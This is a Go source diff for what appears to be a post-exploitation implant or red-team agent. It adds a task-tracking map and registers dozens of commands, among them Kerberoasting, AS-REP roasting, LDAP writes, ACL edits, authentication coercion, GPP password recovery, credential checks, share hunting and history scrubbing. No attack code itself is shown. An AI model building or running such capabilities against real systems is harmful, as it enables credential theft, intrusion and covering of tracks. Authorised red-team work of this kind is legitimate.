@@ -10,6 +10,10 @@ import (
 var (
 	commandRegistry = make(map[string]structs.Command)
 	registryMutex   sync.RWMutex
+
+	// runningTasks tracks currently executing tasks by task ID.
+	// Used by jobs/jobkill commands to list and cancel running tasks.
+	runningTasks sync.Map // map[string]*structs.Task
 )
 
 // Initialize sets up all available commands
@@ -46,11 +50,13 @@ func Initialize() {
 	RegisterCommand(&LinkCommand{})
 	RegisterCommand(&UnlinkCommand{})
 	RegisterCommand(&LdapQueryCommand{})
+	RegisterCommand(&LdapWriteCommand{})
 	RegisterCommand(&KerberoastCommand{})
 	RegisterCommand(&AsrepCommand{})
 	RegisterCommand(&SmbCommand{})
 	RegisterCommand(&DnsCommand{})
 	RegisterCommand(&WinrmCommand{})
+	RegisterCommand(&AclEditCommand{})
 	RegisterCommand(&AdcsCommand{})
 	RegisterCommand(&KerbDelegationCommand{})
 	RegisterCommand(&SshExecCommand{})
@@ -74,6 +80,52 @@ func Initialize() {
 	RegisterCommand(&GppPasswordCommand{})
 	RegisterCommand(&ConfigCommand{})
 	RegisterCommand(&HistoryScrubCommand{})
+	RegisterCommand(&CoerceCommand{})
+	RegisterCommand(&FindAdminCommand{})
+	RegisterCommand(&HashCommand{})
+	RegisterCommand(&ChmodCommand{})
+	RegisterCommand(&ChownCommand{})
+	RegisterCommand(&StatCommand{})
+	RegisterCommand(&TailCommand{})
+	RegisterCommand(&WriteFileCommand{})
+	RegisterCommand(&Base64Command{})
+	RegisterCommand(&TouchCommand{})
+	RegisterCommand(&HexdumpCommand{})
+	RegisterCommand(&StringsCommand{})
+	RegisterCommand(&SecureDeleteCommand{})
+	RegisterCommand(&WcCommand{})
+	RegisterCommand(&DuCommand{})
+	RegisterCommand(&DiffCommand{})
+	RegisterCommand(&DfCommand{})
+	RegisterCommand(&MountCommand{})
+	RegisterCommand(&SortCommand{})
+	RegisterCommand(&UniqCommand{})
+	RegisterCommand(&TacCommand{})
+	RegisterCommand(&CutCommand{})
+	RegisterCommand(&TrCommand{})
+	RegisterCommand(&ProcessTreeCommand{})
+	RegisterCommand(&WlanProfilesCommand{})
+	RegisterCommand(&CloudMetadataCommand{})
+	RegisterCommand(&EncryptCommand{})
+	RegisterCommand(&ProxyCheckCommand{})
+	RegisterCommand(&FileTypeCommand{})
+	RegisterCommand(&LastCommand{})
+	RegisterCommand(&PingCommand{})
+	RegisterCommand(&UptimeCommand{})
+	RegisterCommand(&WhoCommand{})
+	RegisterCommand(&ContainerDetectCommand{})
+	RegisterCommand(&VmDetectCommand{})
+	RegisterCommand(&PkgListCommand{})
+	RegisterCommand(&SecurityInfoCommand{})
+	RegisterCommand(&JobsCommand{})
+	RegisterCommand(&JobkillCommand{})
+	RegisterCommand(&TriageCommand{})
+	RegisterCommand(&SuspendCommand{})
+	RegisterCommand(&LateralCheckCommand{})
+	RegisterCommand(&ShareHuntCommand{})
+	RegisterCommand(&CredCheckCommand{})
+	RegisterCommand(&LnCommand{})
+	RegisterCommand(&FileAttrCommand{})
 
 	// Register platform-specific commands
 	registerPlatformCommands()
@@ -96,6 +148,38 @@ func GetCommand(name string) structs.Command {
 	defer registryMutex.RUnlock()
 
 	return commandRegistry[name]
+}
+
+// TrackTask registers a task as currently running (called by main loop)
+func TrackTask(t *structs.Task) {
+	runningTasks.Store(t.ID, t)
+}
+
+// UntrackTask removes a task from the running set (called when task completes)
+func UntrackTask(id string) {
+	runningTasks.Delete(id)
+}
+
+// GetRunningTasks returns a snapshot of all currently running tasks
+func GetRunningTasks() map[string]*structs.Task {
+	tasks := make(map[string]*structs.Task)
+	runningTasks.Range(func(key, value interface{}) bool {
+		if t, ok := value.(*structs.Task); ok {
+			tasks[key.(string)] = t
+		}
+		return true
+	})
+	return tasks
+}
+
+// GetRunningTask returns a specific running task by ID
+func GetRunningTask(id string) (*structs.Task, bool) {
+	if v, ok := runningTasks.Load(id); ok {
+		if t, ok := v.(*structs.Task); ok {
+			return t, true
+		}
+	}
+	return nil, false
 }
 
 // GetAllCommands returns all registered commands
